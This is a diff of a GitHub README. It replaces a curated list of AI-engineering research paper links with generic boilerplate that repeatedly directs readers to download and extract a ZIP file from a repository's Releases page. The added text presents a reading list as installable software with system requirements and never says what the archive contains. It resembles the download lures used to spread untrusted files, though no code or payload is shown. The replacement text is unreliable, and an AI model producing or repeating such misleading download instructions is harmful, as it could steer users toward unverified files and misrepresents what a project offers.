@@ -1,136 +1,67 @@
-# AI Engineering Transition Path
-Research papers for software engineers to transition to AI Engineering
+# 🚀 ai-engineering-resources - Essential Tools for AI Transition
 
-## Tokenization
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/ochiee/ai-engineering-resources/releases)
 
-- [Byte-pair Encoding](https://arxiv.org/pdf/1508.07909)
-- [Byte Latent Transformer: Patches Scale Better Than Tokens](https://arxiv.org/pdf/2412.09871)
+## 📖 Overview
+The **ai-engineering-resources** repository offers valuable research papers and blogs that help you transition to AI Engineering. This collection covers topics such as AI, large language models (LLMs), and transformers. Whether you're looking for foundational concepts or advanced discussions, this resource is designed for you.
 
-## Vectorization
+## 🚀 Getting Started
+This guide will help you download and run the software from the Releases page. Follow these simple steps to get started.
 
-- [BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding](https://arxiv.org/pdf/1810.04805)
-- [IMAGEBIND: One Embedding Space To Bind Them All](https://arxiv.org/pdf/2305.05665)
-- [SONAR: Sentence-Level Multimodal and Language-Agnostic Representations](https://arxiv.org/pdf/2308.11466)
-- [FAISS library](https://arxiv.org/pdf/2401.08281)
-- [Facebook Large Concept Models](https://arxiv.org/pdf/2412.08821v2)
+### Step 1: Visit the Releases Page
+To get the latest version of **ai-engineering-resources**, visit the Releases page here: [GitHub Releases](https://github.com/ochiee/ai-engineering-resources/releases). This page contains all the versions available for download, along with their release notes.
 
-## Infrastructure
+### Step 2: Choose Your Download
+On the Releases page, you’ll find various versions of the application. Look for the latest release listed at the top. 
 
-- [TensorFlow](https://arxiv.org/pdf/1605.08695)
-- [Deepseek filesystem](https://github.com/deepseek-ai/3FS/blob/main/docs/design_notes.md)
-- [Milvus DB](https://www.cs.purdue.edu/homes/csjgwang/pubs/SIGMOD21_Milvus.pdf)
-- [Billion Scale Similarity Search : FAISS](https://arxiv.org/pdf/1702.08734)
-- [Ray](https://arxiv.org/abs/1712.05889)
+- Click on the **Assets** dropdown to see the available files associated with the version.
+- If you see a file named something like `ai-engineering-resources.zip`, this is the file you need.
 
-## Core Architecture
+### Step 3: Download the File
+To start the download:
 
-- [Attention is All You Need](https://papers.neurips.cc/paper/7181-attention-is-all-you-need.pdf)
-- [FlashAttention](https://arxiv.org/pdf/2205.14135)
-- [Multi Query Attention](https://arxiv.org/pdf/1911.02150) 
-- [Grouped Query Attention](https://arxiv.org/pdf/2305.13245)
-- [Google Titans outperform Transformers](https://arxiv.org/pdf/2501.00663)
-- [VideoRoPE: Rotary Position Embedding](https://arxiv.org/pdf/2502.05173)
+1. Click on the file name (e.g., `ai-engineering-resources.zip`) in the Assets section.
+2. Depending on your browser settings, the file will automatically download, or you may be prompted to choose a location on your computer to save it.
 
-## Mixture of Experts
+### Step 4: Extract the Files
+Once the download is complete, locate the file on your computer. It may be in your Downloads folder unless you specified a different location. Follow these steps to extract the contents:
 
-- [Sparsely-Gated Mixture-of-Experts Layer](https://arxiv.org/pdf/1701.06538)
-- [GShard](https://arxiv.org/abs/2006.16668)
-- [Switch Transformers](https://arxiv.org/abs/2101.03961)
+1. Right-click on the downloaded ZIP file.
+2. Select **Extract All** on Windows, or **Open With > Archive Utility** on Mac.
+3. Choose a destination folder and click **Extract**. 
 
-## RLHF
+Now you have the contents available for use.
 
-- [Deep Reinforcement Learning with Human Feedback](https://arxiv.org/pdf/1706.03741)
-- [Fine-Tuning Language Models with RHLF](https://arxiv.org/pdf/1909.08593)
-- [Training language models with RHLF](https://arxiv.org/pdf/2203.02155)
+### Step 5: Open the Documentation
+Inside the extracted folder, you will find various documents that provide guidance on using the resources. Open the README file for detailed information on how to proceed with the research papers and blogs effectively.
 
-## Chain of Thought
+### Step 6: Explore the Resources
+The repository contains several papers and blog posts. Each piece of content offers insights into AI engineering concepts, practical applications, and the latest trends in the field. 
 
-- [Chain-of-Thought Prompting Elicits Reasoning in Large Language Models](https://arxiv.org/pdf/2201.11903)
-- [Chain of thought](https://arxiv.org/pdf/2411.14405v1)
-- [Demystifying Long Chain-of-Thought Reasoning in LLMs](https://arxiv.org/pdf/2502.03373)
+Take your time to read through these resources. You can gain a deeper understanding of how AI Engineering works and its applications in real-world scenarios.
 
-## Reasoning
+## 🔍 Key Features
+- **Comprehensive Coverage**: Access various research papers, blogs, and articles focused on AI Engineering.
+- **User-Friendly**: All resources are written for easy understanding, making them suitable for beginners and experts alike.
+- **Regular Updates**: The collection is updated regularly, ensuring you receive the most current information and trends in the AI field.
 
-- [Transformer Reasoning Capabilities](https://arxiv.org/pdf/2405.18512)
-- [Large Language Monkeys: Scaling Inference Compute with Repeated Sampling](https://arxiv.org/pdf/2407.21787)
-- [Scale model test times is better than scaling parameters](https://arxiv.org/pdf/2408.03314)
-- [Training Large Language Models to Reason in a Continuous Latent Space](https://arxiv.org/pdf/2412.06769)
-- [DeepSeek R1](https://arxiv.org/pdf/2501.12948v1)
-- [A Probabilistic Inference Approach to Inference-Time Scaling of LLMs using Particle-Based Monte Carlo Methods](https://arxiv.org/pdf/2502.01618)
-- [Latent Reasoning: A Recurrent Depth Approach](https://arxiv.org/pdf/2502.05171)
-- [Syntactic and Semantic Control of Large Language Models via Sequential Monte Carlo](https://arxiv.org/pdf/2504.13139)
+## 📋 System Requirements
+To run the resources effectively, make sure you have:
 
-## Optimizations
+- A computer with at least 4GB of RAM.
+- A modern web browser (such as Chrome, Firefox, or Safari) for optimal viewing of online resources.
+- A PDF reader (e.g., Adobe Acrobat Reader) to view downloaded research papers.
 
-- [The Era of 1-bit LLMs: All Large Language Models are in 1.58 Bits](https://arxiv.org/pdf/2402.17764)
-- [FlashAttention-3: Fast and Accurate Attention with Asynchrony and Low-precision](https://arxiv.org/pdf/2407.08608)
-- [ByteDance 1.58](https://arxiv.org/pdf/2412.18653v1)
-- [Transformer Square](https://arxiv.org/pdf/2501.06252)
-- [Inference-Time Scaling for Diffusion Models beyond Scaling Denoising Steps](https://arxiv.org/pdf/2501.09732)
-- [1b outperforms 405b](https://arxiv.org/pdf/2502.06703)
-- [Speculative Decoding](https://arxiv.org/pdf/2211.17192)
+## 💡 Tips for Success
+- Bookmark the Releases page for easy access to future updates.
+- Join forums and online communities focused on AI to discuss insights from the papers and blogs.
+- Share your knowledge with peers to reinforce your learning and expand your understanding.
 
-## Distillation
+## ✅ Download & Install 
+You can easily download the resources from the following link: [GitHub Releases](https://github.com/ochiee/ai-engineering-resources/releases). Just follow the steps above to access the wealth of information available.
 
-- [Distilling the Knowledge in a Neural Network](https://arxiv.org/pdf/1503.02531)
-- [BYOL - Distilled Architecture](https://arxiv.org/pdf/2006.07733)
-- [DINO](https://arxiv.org/pdf/2104.14294)
+## 📞 Need Help?
+If you encounter any issues during the download or navigation process, feel free to reach out to dedicated support communities on GitHub or browse help forums related to AI Engineering.
 
-## SSMs
-
-- [RWKV: Reinventing RNNs for the Transformer Era](https://arxiv.org/pdf/2305.13048)
-- [Mamba](https://arxiv.org/pdf/2312.00752)
-- [Transformers are SSMs: Generalized Models and Efficient Algorithms Through Structured State Space Duality](https://arxiv.org/pdf/2405.21060)
-- [Distilling Transformers to SSMs](https://arxiv.org/pdf/2408.10189)
-- [LoLCATs: On Low-Rank Linearizing of Large Language Models](https://arxiv.org/pdf/2410.10254)
-- [Think Slow, Fast](https://arxiv.org/pdf/2502.20339)
-
-## Competition Models
-
-- [Google Math Olympiad 2](https://arxiv.org/pdf/2502.03544)
-- [Competitive Programming with Large Reasoning Models](https://arxiv.org/pdf/2502.06807)
-- [Google Math Olympiad 1](https://www.nature.com/articles/s41586-023-06747-5)
-
-## Hype Makers
-
-- [Can AI be made to think critically](https://arxiv.org/pdf/2501.04682)
-- [Evolving Deeper LLM Thinking](https://arxiv.org/pdf/2501.09891)
-- [LLMs Can Easily Learn to Reason from Demonstrations Structure](https://arxiv.org/pdf/2502.07374)
-
-## Hype Breakers
-
-- [Separating communication from intelligence](https://arxiv.org/pdf/2301.06627)
-- [Language is not intelligence](https://gwern.net/doc/psychology/linguistics/2024-fedorenko.pdf)
-
-## Image Transformers
-
-- [Image is 16x16 word](https://arxiv.org/pdf/2010.11929)
-- [CLIP](https://arxiv.org/pdf/2103.00020)
-- [deepseek image generation](https://arxiv.org/pdf/2501.17811)
-
-## Video Transformers
-
-- [ViViT: A Video Vision Transformer](https://arxiv.org/pdf/2103.15691)
-- [Joint Embedding abstractions with self-supervised video masks](https://arxiv.org/pdf/2404.08471)
-- [Facebook VideoJAM ai gen](https://arxiv.org/pdf/2502.02492)
-
-## Context Engineering
-- [DSPy](https://arxiv.org/pdf/2310.03714)
-- [Retrieval-Augmented Generation with Knowledge Graphs for Customer Service Question Answering](https://arxiv.org/pdf/2404.17723v1)
-- [Model Context Protocol](https://www.anthropic.com/news/model-context-protocol)
-
-## Case Studies
-
-- [Automated Unit Test Improvement using Large Language Models at Meta](https://arxiv.org/pdf/2402.09171)
-- [OpenAI o1 System Card](https://arxiv.org/pdf/2412.16720)
-- [LLM-powered bug catchers](https://arxiv.org/pdf/2501.12862)
-- [Chain-of-Retrieval Augmented Generation](https://arxiv.org/pdf/2501.14342)
-- [Swiggy Search](https://bytes.swiggy.com/improving-search-relevance-in-hyperlocal-food-delivery-using-small-language-models-ecda2acc24e6)
-- [Swarm by OpenAI](https://github.com/openai/swarm)
-- [Netflix Foundation Models](https://netflixtechblog.com/foundation-model-for-personalized-recommendation-1a0bd8e02d39)
-- [uber queryGPT](https://www.uber.com/en-IN/blog/query-gpt/)
-
-## Video Course
-
-AI Engineering: https://interviewready.io/course-page/ai-engineering
-
+Explore the world of AI Engineering with our resources today. Happy learning!
